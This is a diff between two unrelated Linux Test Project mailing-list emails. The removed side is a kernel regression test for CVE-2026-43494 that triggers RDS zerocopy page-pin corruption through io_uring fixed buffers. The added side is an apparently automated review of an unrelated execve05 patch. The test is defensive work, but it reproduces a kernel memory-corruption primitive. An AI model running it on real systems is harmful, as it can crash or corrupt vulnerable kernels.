@@ -4,80 +4,81 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from picard.linux.it (picard.linux.it [213.254.12.146])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id ADFA8CD6E75
-	for <ltp@archiver.kernel.org>; Thu,  4 Jun 2026 16:39:52 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 87C39CD6E77
+	for <ltp@archiver.kernel.org>; Thu,  4 Jun 2026 17:55:30 +0000 (UTC)
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id E7FAE3E6193
-	for <ltp@archiver.kernel.org>; Thu,  4 Jun 2026 18:39:50 +0200 (CEST)
-Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it [217.194.8.3])
+	by picard.linux.it (Postfix) with ESMTP id 635873E71BD
+	for <ltp@archiver.kernel.org>; Thu,  4 Jun 2026 19:55:28 +0200 (CEST)
+Received: from in-5.smtp.seeweb.it (in-5.smtp.seeweb.it [217.194.8.5])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature ECDSA (secp384r1))
  (No client certificate requested)
- by picard.linux.it (Postfix) with ESMTPS id 20C733E71BE
- for <ltp@lists.linux.it>; Thu,  4 Jun 2026 18:39:26 +0200 (CEST)
-Received: from mail-ej1-x62a.google.com (mail-ej1-x62a.google.com
- [IPv6:2a00:1450:4864:20::62a])
+ by picard.linux.it (Postfix) with ESMTPS id 62ECE3CD56E
+ for <ltp@lists.linux.it>; Thu,  4 Jun 2026 19:55:11 +0200 (CEST)
+Received: from mail-qv1-xf43.google.com (mail-qv1-xf43.google.com
+ [IPv6:2607:f8b0:4864:20::f43])
  (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
  key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
  (No client certificate requested)
- by in-3.smtp.seeweb.it (Postfix) with ESMTPS id 6A2971A008B9
- for <ltp@lists.linux.it>; Thu,  4 Jun 2026 18:39:25 +0200 (CEST)
-Received: by mail-ej1-x62a.google.com with SMTP id
- a640c23a62f3a-bed2195323cso139631566b.1
- for <ltp@lists.linux.it>; Thu, 04 Jun 2026 09:39:25 -0700 (PDT)
+ by in-5.smtp.seeweb.it (Postfix) with ESMTPS id EFF96600A7C
+ for <ltp@lists.linux.it>; Thu,  4 Jun 2026 19:55:10 +0200 (CEST)
+Received: by mail-qv1-xf43.google.com with SMTP id
+ 6a1803df08f44-8ced8f44da0so10261996d6.2
+ for <ltp@lists.linux.it>; Thu, 04 Jun 2026 10:55:10 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=gmail.com; s=20251104; t=1780591165; x=1781195965; darn=lists.linux.it;
+ d=gmail.com; s=20251104; t=1780595710; x=1781200510; darn=lists.linux.it;
  h=content-transfer-encoding:mime-version:references:in-reply-to
  :message-id:date:subject:cc:to:from:from:to:cc:subject:date
  :message-id:reply-to;
- bh=imMDUl+WASQgntWwlxQqMkSAKibs6tboel0xMHwlB1Y=;
- b=MRHtf8I4PRohEHTZlIjFIoAz/0aCOIUbSD5KJ742wbd3b4JIHOHhdBSZANGsrYe7/Y
- fdGImumyrbsreTBRcqsSbOJq1r6ZTRces+F3L52gmBvtJUxcMnp+MgKWFXtGMN+eMlwa
- E7eCv5mZJsCdMbM15Pm1fGyFUsehmCnWd0+dY+KgffRWQCAV7h7GCrvKbqCt/VpVPObi
- ZQ6r8uCyi78jTHCZof+j5EpbmS8wNugb823ZMMwnJcZmfbwfj9JryCSn3HOCqT+g7Qd9
- K5wys36gsf04HObkKXPLEJ6BKcTCHwfkoxA9aC5rInJBDzT9O4yIeX1hfxu59qdLrJPl
- UAqA==
+ bh=HLXOWrmKt1qpX6/1w8VtgjlV/5XY3MAUWc9qCKlPPeI=;
+ b=Xoeafyq+Y9T5I8ZhqzM2aAhVlXILSjy+YoFvLhVM3Q2TAMA1lF0qIyI/HUDYps9T13
+ NWwckF17k7IOFJDCqbBpaEi7BFh7LNA3w9o1O9AkMwSv09/jCObVNbVzWnGaJcG5NJNY
+ fHVXv0LDDjr7AP5QIH1zSPikkhXFAq+Gsdsy7PrKM8CzKMn9LFHJnzUINfYWs3h9oun+
+ yGq+NAf19VPa3s2KOacZOvEsAs5rbxSdWWawfVZZkujAISNc2aGj46oY2qatCXXgWC4C
+ R0gvmvMM9lJB/bvs8GC262AxqIMClrBYJoDknu748DYZrtIH4N08bYtaZ1Gsc/KTmdW+
+ PlXw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20251104; t=1780591165; x=1781195965;
+ d=1e100.net; s=20251104; t=1780595710; x=1781200510;
  h=content-transfer-encoding:mime-version:references:in-reply-to
  :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
  :to:cc:subject:date:message-id:reply-to;
- bh=imMDUl+WASQgntWwlxQqMkSAKibs6tboel0xMHwlB1Y=;
- b=Q686fXaGkY8tURQ4lRndD8c2B/XxuMt8+QuUROJUP/KSf5hWEduANgUyHhkY803C9O
- Hu1zuyq/7gb+K5TipeUQbqW3YtPuJADUy5LL4FOhHEbK1WqjgNjSkD8h74mRCsQGKdEm
- ploHOKqXywu5OVtnAbFpz0jCBfFqjWiuOJmIczC6ifH13UfftXsipjOCDgBgK8vLSwW9
- tqk/3XvCKoPO/iLQMJeQuaMih2Bv59xszCY3AnkkghbWMTqC7QJ2QIVHqZSaCVZu/mkw
- oZJ1xNM/P+8R00cJZzwxcMsbMGwTIpZnQoIyWNhNW7q+rebBs4ItK2Fi8g1bgvOZegQQ
- M08Q==
-X-Gm-Message-State: AOJu0YzAquLfgBsEttv4Fz4UxMVyxnigzba+ua4alx9mqmMRhzsynlgw
- T7RnBqp3lEj4abgiCnFMrSkL18HTvHKLbdCa9ClYzE4GhtNZdU/A5P5A4RSe5A==
-X-Gm-Gg: Acq92OGb9Jx3l7P31uKHVTYhdzj38btngtBF5XJIKWI4eAFKmooD9tfGecGa1ilEVrW
- Vo5vYQV1+eyaRqlFF9tq1a/Z5EDfv0Q6hlqsaOMoxzQ+YnlhPJrlCVvoWe3kgeen3OdrzWhJ8Zq
- zLZKw1Rs2Ka7Qnpr6CHWNQqX+6VjcEwlZngMiatrhxlQXzDLebFHJGAsjSiSTMGSQMQ5znW0x2m
- asSL7BMRmlJ6BT+T2tti9nwQPSMPIrq66cXHyebsbpSYB10xenBD9FlEQx+b4I8x6OmVIw17Kia
- wl3ccr+bh3hzictq85QPQzVjBs9ai0XJF8i22HbG/Ny8GUYgO1Zkgd2as3TdU1ySCBWSXI0B72I
- MCYa0i2/MQnPS8CGQiXPqS14II7DXSLKFCWXynfer43KKHBW7yUUnnEt3HUZ/UoSeZ8N+TqXJad
- v6cpKgaUMQXcBVjieYziMbAwoJoWdfkQyRdKa1ABb9+HwC0bNJbA34o/ziFy5zTXwOmYL5
-X-Received: by 2002:a17:907:1784:b0:bdb:b76c:4dd0 with SMTP id
- a640c23a62f3a-bf0af5009d5mr468277366b.40.1780591164500; 
- Thu, 04 Jun 2026 09:39:24 -0700 (PDT)
-Received: from localhost ([37.109.163.161]) by smtp.gmail.com with ESMTPSA id
- a640c23a62f3a-bf0517721e5sm335087966b.9.2026.06.04.09.39.23
+ bh=HLXOWrmKt1qpX6/1w8VtgjlV/5XY3MAUWc9qCKlPPeI=;
+ b=etYWuR+0w+TIjf2e+c6jz+CXadvdzmDpyaOyniWD224R7M8LG343UkVKPa1ALf/Cth
+ MKzptYfoGwzijIAqmxsa2PIw8I8/3m0Klc/sInGu/nOedG/dvV3CIEOmh8WkoNU6VqGF
+ sHYkfw84EEfQEtE7dxkcKixfp/EFEFfEZUjMavtzIBzLlD2MEri1W3RA0UYeGjcX5aEc
+ 1mSKlOdM6qy56K7RV+Q8+bxmN0FQRJGEpkijV41FZtQrjp5CRYRv+mB20TVp3j9aJlM6
+ 7zxhsy98iWy1n1QE8uxuVMFkRF0C8x4p44wyiLZG5uL1VybuUID1TdxOvFWFY+VAvN3Y
+ K28A==
+X-Gm-Message-State: AOJu0YzeIsHbrUiNvb9ZiV6+dn6S6nNQgZfngQG5jmUuQPaA+HhrZkAq
+ qcsD0Edf22sjZmUBhkt5S+jt/331HjNwYs+eB3+osG1kDgYan9hLgwMj
+X-Gm-Gg: Acq92OEOjKS87eJ/3wYnkCslSZUdcXIJhi1SDPOipnOuw15OEUL/txjKQvbf857Al1G
+ 726sr4VEg/fybvY3oJx9TDDgJ8PSFV1MDxx8dG/FoDL+dYd956gTyJs4yNIS+hh5wsQ8Jy797JL
+ yr6NuZB7ztG89tzy2/LzklddNARlC5ko4ptm6r6azK+1iMNHb1PZH96gq06OmfB/Dt2hb7Y7fqd
+ EOKuDQkT6m8cxd9f9xjRZXDAIssAiz4Rr3L4eGUmajK6cAQ0ZLNTf8EPnOr28DJsoYpxX5mDTSm
+ sRqaxv93I7ZGU/7RXNXFreKqIR32dTEWGsNHl3/JnhJvxnrmsz8tKwohNG12Qp+SpJBfJ19QWw2
+ G0wXeIbvLNIEOZINcF/Fm5Mj5TcxjQPmu8EMnTM0fTxd7tVbuqlrwf5YyZEeRtHTqevLyRaOkto
+ DZsk4e8drA7xkQI3EVSYRNiWCMpl+r7IrEJ4cfgzDoCil+JmPcGfVkUVtu1M1rU5ttu02iv3Fid
+ vtC6njaQUc/Z4muszcopBQTQVI405aK3E4/mUDog0+mSt0=
+X-Received: by 2002:a0c:e749:0:b0:8cc:60dc:a249 with SMTP id
+ 6a1803df08f44-8cee63b0d08mr1673986d6.42.1780595709501; 
+ Thu, 04 Jun 2026 10:55:09 -0700 (PDT)
+Received: from
+ runnervm3jyl0.t0wjbh1ntu3exmtqficsg1sdwa.cx.internal.cloudapp.net
+ ([20.49.61.54]) by smtp.gmail.com with ESMTPSA id
+ 6a1803df08f44-8ceccdb5e92sm58581206d6.11.2026.06.04.10.55.08
  (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Thu, 04 Jun 2026 09:39:24 -0700 (PDT)
-From: Sebastian Chlad <sebastianchlad@gmail.com>
-X-Google-Original-From: Sebastian Chlad <sebastian.chlad@suse.com>
-To: ltp@lists.linux.it
-Date: Thu,  4 Jun 2026 18:38:30 +0200
-Message-ID: <20260604163909.17853-2-sebastian.chlad@suse.com>
-X-Mailer: git-send-email 2.51.0
-In-Reply-To: <20260604163909.17853-1-sebastian.chlad@suse.com>
-References: <89e9004c-4415-4f05-8288-4f73a491d8dd@suse.cz>
- <20260604163909.17853-1-sebastian.chlad@suse.com>
+ Thu, 04 Jun 2026 10:55:09 -0700 (PDT)
+From: linuxtestproject.agent@gmail.com
+To: yeziwen1989@yeah.net
+Date: Thu,  4 Jun 2026 17:55:07 +0000
+Message-ID: <20260604175507.3923-1-linuxtestproject.agent@gmail.com>
+X-Mailer: git-send-email 2.54.0
+In-Reply-To: <20260604160112.159917-1-yeziwen1989@yeah.net>
+References: <20260604160112.159917-1-yeziwen1989@yeah.net>
 MIME-Version: 1.0
-X-Virus-Scanned: clamav-milter 1.0.9 at in-3.smtp.seeweb.it
+X-Virus-Scanned: clamav-milter 1.0.9 at in-5.smtp.seeweb.it
 X-Virus-Status: Clean
-Subject: [LTP] [PATCH v5 2/2] io_uring04: Add CVE-2026-43494 regression test
+Subject: Re: [LTP] execve05: add exit call when execve failed
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -89,437 +90,37 @@ List-Post: <mailto:ltp@lists.linux.it>
 List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
 List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
  <mailto:ltp-request@lists.linux.it?subject=subscribe>
-Cc: Sebastian Chlad <sebastian.chlad@suse.com>
+Cc: ltp@lists.linux.it
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
 Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
 
-Test for PinTheft (CVE-2026-43494), fixed by:
-e17492979319 ("net/rds: reset op_nents when zerocopy page pin fails")
+Hi Yeguojin,
 
-The bug is in the RDS zerocopy send error path: when pinning user pages
-for zerocopy send fails partway through, the error cleanup drops a page
-reference that the RDS message cleanup will drop again. Combined with
-io_uring fixed buffer registrations, this double-drop drains the
-FOLL_PIN counter and causes a page-cache overwrite exploitable for local
-privilege escalation (PinTheft).
+On Fri Jun 5 00:01:12 2026, Yeguojin wrote:
+> execve05: add exit call when execve failed
 
-Signed-off-by: Sebastian Chlad <sebastian.chlad@suse.com>
+The Signed-off-by: tag is missing. It is mandatory for all LTP patches.
+
+Verdict: Needs revision
+
+Pre-existing issues:
+
+testcases/kernel/syscalls/execve/execve05.c: The doc comment has a
+duplicate reference -- "execve(2) :manpage:`execve(2)`" -- which
+renders as "execve(2) execve(2)" in the documentation. The plain text
+"execve(2)" before the :manpage: directive should be removed.
+
 ---
+Note:
 
-v5:
-Changes from the review applied.
-Notably:
-- Split LAPI changes into a separate commit
-- Rename pintheft.c to io_uring04.c
-- Remove redundant headers already included by tst_test.h
-- Move RDS_CMSG_ZCOPY_COOKIE fallback to new lapi/rds.h
-- Reduce CLEANUP_WAIT_SECS from 30 to 10
-- Use EAFNOSUPPORT as the sole RDS availability check
-- Use port 0 + TST_GETSOCKPORT() instead of PID-derived port
-- Don't call cleanup() from trigger(); move buffer unregistration to run()
-- Use tst_reap_children() instead of SAFE_WAITPID and status check
-- Fork all RSS children in parallel, check taint once after tst_reap_children()
-- Remove buffer_registered/buffer_cloned flags; pair unregister with SAFE_CLOSE
-- Remove manual fd = -1 after SAFE_CLOSE
+The agent can sometimes produce false positives although often its
+findings are genuine. If you find issues with the review, please
+comment this email or ignore the suggestions.
 
- runtest/cve                                   |   1 +
- runtest/syscalls                              |   1 +
- .../kernel/syscalls/io_uring/io_uring04.c     | 358 ++++++++++++++++++
- 3 files changed, 360 insertions(+)
- create mode 100644 testcases/kernel/syscalls/io_uring/io_uring04.c
-
-diff --git a/runtest/cve b/runtest/cve
-index a5952b56c..cc664bb93 100644
---- a/runtest/cve
-+++ b/runtest/cve
-@@ -95,5 +95,6 @@ cve-2025-38236 cve-2025-38236
- cve-2025-21756 cve-2025-21756
- cve-2026-31431 af_alg08
- cve-2026-43284 xfrm01
-+cve-2026-43494 io_uring04
- cve-2026-46300 xfrm02
- cve-2026-46300-skb-segment xfrm03
-diff --git a/runtest/syscalls b/runtest/syscalls
-index f790e8f84..6b047b5fd 100644
---- a/runtest/syscalls
-+++ b/runtest/syscalls
-@@ -1904,6 +1904,7 @@ membarrier01 membarrier01
- io_uring01 io_uring01
- io_uring02 io_uring02
- io_uring03 io_uring03
-+io_uring04 io_uring04
- 
- # Tests below may cause kernel memory leak
- perf_event_open03 perf_event_open03
-diff --git a/testcases/kernel/syscalls/io_uring/io_uring04.c b/testcases/kernel/syscalls/io_uring/io_uring04.c
-new file mode 100644
-index 000000000..040f1bdf5
---- /dev/null
-+++ b/testcases/kernel/syscalls/io_uring/io_uring04.c
-@@ -0,0 +1,358 @@
-+// SPDX-License-Identifier: GPL-2.0-or-later
-+/*
-+ * Copyright (C) 2026 SUSE LLC Sebastian Chlad <sebastian.chlad@suse.com>
-+ */
-+
-+/*\
-+ * CVE-2026-43494
-+ *
-+ * Test for PinTheft, fixed by:
-+ * e17492979319 ("net/rds: reset op_nents when zerocopy page pin fails").
-+ *
-+ * The bug is in the RDS zerocopy send error path. When RDS pins user pages for
-+ * zerocopy send and a later page faults, the error cleanup can drop references
-+ * for pages that are later released again during RDS message cleanup. This
-+ * corrupts page reference accounting.
-+ *
-+ * The public exploit combines this RDS reference-counting bug with io_uring
-+ * fixed buffers and cloned buffer registrations to turn stale page references
-+ * into a page-cache overwrite and local privilege escalation.
-+ *
-+ * This test does not attempt privilege escalation. It triggers the underlying
-+ * RDS zerocopy failure path by sending GUP_PIN_COUNTING_BIAS (1024) two-page
-+ * iovecs where the first page is registered as an io_uring fixed buffer and
-+ * the second page is PROT_NONE.  Each failing send steals one FOLL_PIN
-+ * reference; after 1024 sends the io_uring-held page pin is exhausted.
-+ * Unregistering the fixed buffers on a vulnerable kernel then tries to unpin
-+ * a page with no remaining FOLL_PIN references, triggering a kernel WARN or
-+ * BUG_ON and tainting the kernel.
-+ *
-+ * Vulnerable kernels may crash, taint, panic, or hang during sendmsg() or
-+ * subsequent cleanup. Run only on disposable systems.
-+ *
-+ * Reproducer is based on:
-+ * https://github.com/v12-security/pocs/tree/main/pintheft
-+ */
-+
-+#include <stdint.h>
-+
-+#include "tst_test.h"
-+#include "lapi/io_uring.h"
-+#include "lapi/rds.h"
-+#include "lapi/socket.h"
-+
-+#define CLEANUP_WAIT_SECS	10
-+#define RSS_CHECK_CHILDREN	8
-+#define RSS_CHECK_SIZE		(16 * 1024 * 1024)
-+
-+/* Matches mm/gup.c: FOLL_PIN adds this bias to the page refcount. */
-+#define GUP_PIN_COUNTING_BIAS	1024
-+
-+static int ring_fd1 = -1;
-+static int ring_fd2 = -1;
-+static int rds_fd = -1;
-+static long page_size;
-+static void *mapped_pages;
-+
-+/* Inspired by liburing's io_uring_clone_buffers(), but using raw ring fds. */
-+static int clone_buffers(int dst_fd, int src_fd)
-+{
-+	struct io_uring_clone_buffers clone;
-+
-+	memset(&clone, 0, sizeof(clone));
-+	clone.src_fd = src_fd;
-+
-+	return io_uring_register(dst_fd, IORING_REGISTER_CLONE_BUFFERS,
-+				 &clone, 1);
-+}
-+
-+static void setup(void)
-+{
-+	struct io_uring_params params = {};
-+	struct iovec fixed_iov;
-+	int val;
-+
-+	page_size = SAFE_SYSCONF(_SC_PAGESIZE);
-+	io_uring_setup_supported_by_kernel();
-+
-+	/*
-+	 * The exploit primitive keeps one fixed-buffer registration alive and
-+	 * clones it to another ring. The child runs the FOLL_PIN drain loop;
-+	 * run() unregisters the buffers afterwards to trigger the double-unpin
-+	 * WARN/BUG_ON on vulnerable kernels.
-+	 */
-+	ring_fd1 = io_uring_setup(1, &params);
-+	if (ring_fd1 < 0)
-+		tst_brk(TBROK | TERRNO, "io_uring_setup() failed for first ring");
-+
-+	memset(&params, 0, sizeof(params));
-+
-+	ring_fd2 = io_uring_setup(1, &params);
-+	if (ring_fd2 < 0)
-+		tst_brk(TBROK | TERRNO, "io_uring_setup() failed for second ring");
-+
-+	rds_fd = socket(AF_RDS, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
-+	if (rds_fd < 0) {
-+		if (errno == EAFNOSUPPORT)
-+			tst_brk(TCONF | TERRNO, "RDS is not available");
-+
-+		tst_brk(TBROK | TERRNO, "socket(AF_RDS) failed");
-+	}
-+
-+	/* PinTheft uses the RDS TCP transport, so base RDS is not enough. */
-+	val = RDS_TRANS_TCP;
-+	TEST(setsockopt(rds_fd, SOL_RDS, SO_RDS_TRANSPORT, &val, sizeof(val)));
-+
-+	if (TST_RET) {
-+		if (TST_ERR == ENOPROTOOPT || TST_ERR == EINVAL)
-+			tst_brk(TCONF | TERRNO, "RDS TCP transport is not available");
-+
-+		tst_brk(TBROK | TERRNO, "setsockopt(SO_RDS_TRANSPORT) failed");
-+	}
-+
-+	/*
-+	 * Allocate two adjacent pages: the first one will be pinned as an
-+	 * io_uring fixed buffer, and the second one will be made inaccessible.
-+	 */
-+	mapped_pages = SAFE_MMAP(NULL, 2 * page_size, PROT_READ | PROT_WRITE,
-+				 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-+	memset(mapped_pages, 0xa5, page_size);
-+
-+	/*
-+	 * RDS should successfully pin the first page, then fault on the second.
-+	 * That fault drives the buggy zerocopy error cleanup path.
-+	 */
-+	SAFE_MPROTECT((char *)mapped_pages + page_size, page_size, PROT_NONE);
-+
-+	fixed_iov.iov_base = mapped_pages;
-+	fixed_iov.iov_len = page_size;
-+
-+	/*
-+	 * Register only the first page as an io_uring fixed buffer. This creates
-+	 * the long-term page pin whose reference accounting the RDS bug damages.
-+	 */
-+	if (io_uring_register(ring_fd1, IORING_REGISTER_BUFFERS, &fixed_iov, 1))
-+		tst_brk(TBROK | TERRNO, "IORING_REGISTER_BUFFERS failed");
-+
-+	/*
-+	 * Clone the fixed buffer registration into the second ring, matching the
-+	 * public reproducer's lifetime pattern without performing the later
-+	 * page-cache overwrite stage.
-+	 */
-+	if (clone_buffers(ring_fd2, ring_fd1)) {
-+		if (errno == EINVAL || errno == EOPNOTSUPP)
-+			tst_brk(TCONF | TERRNO, "IORING_REGISTER_CLONE_BUFFERS is not supported");
-+
-+		tst_brk(TBROK | TERRNO, "IORING_REGISTER_CLONE_BUFFERS failed");
-+	}
-+}
-+
-+static void trigger(void)
-+{
-+	struct sockaddr_in bind_addr = {
-+		.sin_family = AF_INET,
-+		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
-+		.sin_port = 0,
-+	};
-+	struct sockaddr_in dst_addr = {
-+		.sin_family = AF_INET,
-+		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
-+	};
-+	char control[CMSG_SPACE(sizeof(uint32_t))];
-+	struct cmsghdr *cmsg;
-+	struct iovec iov = {
-+		.iov_base = mapped_pages,
-+		.iov_len = 2 * page_size,
-+	};
-+	struct msghdr msg = {
-+		.msg_name = &dst_addr,
-+		.msg_namelen = sizeof(dst_addr),
-+		.msg_iov = &iov,
-+		.msg_iovlen = 1,
-+		.msg_control = control,
-+		.msg_controllen = sizeof(control),
-+	};
-+	int ret;
-+	int val;
-+	int i, efaults, first_bad_errno = 0;
-+
-+	/* Mirror the public PoC trigger: RDS zerocopy over TCP. */
-+	val = 1;
-+	if (setsockopt(rds_fd, SOL_SOCKET, SO_ZEROCOPY, &val, sizeof(val))) {
-+		if (errno == ENOPROTOOPT || errno == EINVAL)
-+			tst_brk(TCONF | TERRNO, "SO_ZEROCOPY not supported on RDS sockets");
-+		tst_brk(TBROK | TERRNO, "setsockopt(SO_ZEROCOPY) failed");
-+	}
-+
-+	val = 2 * page_size * 4;
-+	SAFE_SETSOCKOPT(rds_fd, SOL_SOCKET, SO_SNDBUF, &val, sizeof(val));
-+
-+	/*
-+	 * Bind to a kernel-assigned loopback port and send to the next port
-+	 * (unbound). The sends are expected to fail before any useful delivery;
-+	 * the faulting iovec is the interesting part.
-+	 */
-+	SAFE_BIND(rds_fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
-+	dst_addr.sin_port = htons(TST_GETSOCKPORT(rds_fd) + 1);
-+
-+	memset(control, 0, sizeof(control));
-+	cmsg = (struct cmsghdr *)control;
-+	cmsg->cmsg_level = SOL_RDS;
-+	cmsg->cmsg_type = RDS_CMSG_ZCOPY_COOKIE;
-+	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
-+
-+	/*
-+	 * Each send pins page 0, faults on page 1 (PROT_NONE), and on a
-+	 * vulnerable kernel double-drops page 0's reference. EFAULT is the
-+	 * expected error; other errors do not count as successful steals.
-+	 */
-+	for (i = 0, efaults = 0; i < GUP_PIN_COUNTING_BIAS; i++) {
-+		/* rds_cmsg_zcopy() in net/rds/send.c */
-+		*(uint32_t *)CMSG_DATA(cmsg) = (uint32_t)i;
-+
-+		ret = sendmsg(rds_fd, &msg, MSG_ZEROCOPY | MSG_DONTWAIT);
-+		if (ret >= 0)
-+			tst_brk(TBROK, "sendmsg() unexpectedly succeeded at iter %d", i);
-+
-+		if (errno == EFAULT)
-+			efaults++;
-+		else if (!first_bad_errno)
-+			first_bad_errno = errno;
-+	}
-+
-+	if (first_bad_errno) {
-+		tst_res(TINFO, "sendmsg() returned unexpected errno %d (%s) on at least one iteration",
-+			first_bad_errno, tst_strerrno(first_bad_errno));
-+	}
-+
-+	tst_res(TINFO, "Completed %d/%d sendmsg() attempts with EFAULT",
-+		efaults, GUP_PIN_COUNTING_BIAS);
-+
-+	if (efaults == 0)
-+		tst_brk(TCONF, "sendmsg() never returned EFAULT - GUP pin path not exercised");
-+
-+	if (efaults < GUP_PIN_COUNTING_BIAS)
-+		tst_res(TWARN, "Only %d/%d sends returned EFAULT - FOLL_PIN counter may not be fully drained",
-+			efaults, GUP_PIN_COUNTING_BIAS);
-+}
-+
-+static void poke_rss_accounting(void)
-+{
-+	char *mem;
-+
-+	mem = SAFE_MMAP(NULL, RSS_CHECK_SIZE, PROT_READ | PROT_WRITE,
-+			MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-+	memset(mem, 0x5a, RSS_CHECK_SIZE);
-+	SAFE_MUNMAP(mem, RSS_CHECK_SIZE);
-+}
-+
-+static void run(void)
-+{
-+	pid_t pid;
-+	int i;
-+
-+	/*
-+	 * Run the dangerous part in a child so that process teardown can expose
-+	 * delayed RSS/page-accounting damage before the parent reports TPASS.
-+	 */
-+	pid = SAFE_FORK();
-+	if (!pid) {
-+		trigger();
-+		exit(0);
-+	}
-+
-+	tst_reap_children();
-+
-+	/*
-+	 * Unregistering fixed buffers after FOLL_PIN has been drained triggers
-+	 * the double-unpin WARN/BUG_ON on vulnerable kernels.
-+	 */
-+	io_uring_register(ring_fd2, IORING_UNREGISTER_BUFFERS, NULL, 0);
-+	io_uring_register(ring_fd1, IORING_UNREGISTER_BUFFERS, NULL, 0);
-+
-+	if (tst_taint_check()) {
-+		tst_res(TFAIL, "Kernel is vulnerable: tainted after buffer unregistration");
-+		return;
-+	}
-+
-+	/*
-+	 * The visible failure can be delayed until another mm is torn down.
-+	 * Fork all RSS children in parallel, then reap and check taint once.
-+	 */
-+	for (i = 0; i < RSS_CHECK_CHILDREN; i++) {
-+		pid = SAFE_FORK();
-+		if (!pid) {
-+			poke_rss_accounting();
-+			exit(0);
-+		}
-+	}
-+
-+	tst_reap_children();
-+
-+	if (tst_taint_check()) {
-+		tst_res(TFAIL, "Kernel is vulnerable: tainted during RSS accounting checks");
-+		return;
-+	}
-+
-+	/*
-+	 * RDS/page cleanup can run asynchronously after userspace returns from
-+	 * sendmsg() and after file descriptors are closed. Wait before declaring
-+	 * that the kernel merely "seems" to have survived.
-+	 */
-+	for (i = 0; i < CLEANUP_WAIT_SECS; i++) {
-+		sleep(1);
-+
-+		if (tst_taint_check()) {
-+			tst_res(TFAIL, "Kernel is vulnerable: tainted during RDS zerocopy cleanup");
-+			return;
-+		}
-+	}
-+
-+	tst_res(TPASS, "Kernel seems to have survived RDS zerocopy cleanup");
-+}
-+
-+static void cleanup(void)
-+{
-+	if (ring_fd2 >= 0) {
-+		io_uring_register(ring_fd2, IORING_UNREGISTER_BUFFERS, NULL, 0);
-+		SAFE_CLOSE(ring_fd2);
-+	}
-+
-+	if (ring_fd1 >= 0) {
-+		io_uring_register(ring_fd1, IORING_UNREGISTER_BUFFERS, NULL, 0);
-+		SAFE_CLOSE(ring_fd1);
-+	}
-+
-+	if (rds_fd >= 0)
-+		SAFE_CLOSE(rds_fd);
-+
-+	if (mapped_pages) {
-+		SAFE_MUNMAP(mapped_pages, 2 * page_size);
-+		mapped_pages = NULL;
-+	}
-+}
-+
-+static struct tst_test test = {
-+	.test_all = run,
-+	.setup = setup,
-+	.cleanup = cleanup,
-+	.timeout = 60,
-+	.forks_child = 1,
-+	.taint_check = TST_TAINT_W | TST_TAINT_D,
-+	.needs_kconfigs = (const char *[]) {
-+		"CONFIG_RDS",
-+		"CONFIG_RDS_TCP",
-+		"CONFIG_IO_URING",
-+		NULL
-+	},
-+	.save_restore = (const struct tst_path_val[]) {
-+		{"/proc/sys/kernel/io_uring_disabled", "0",
-+			TST_SR_SKIP_MISSING | TST_SR_TCONF_RO},
-+		{}
-+	},
-+	.tags = (const struct tst_tag[]) {
-+		{"linux-git", "e17492979319"},
-+		{"CVE", "2026-43494"},
-+		{}
-+	}
-+};
--- 
-2.51.0
-
+Regards,
+LTP AI Reviewer
 
 -- 
 Mailing list info: https://lists.linux.it/listinfo/ltp
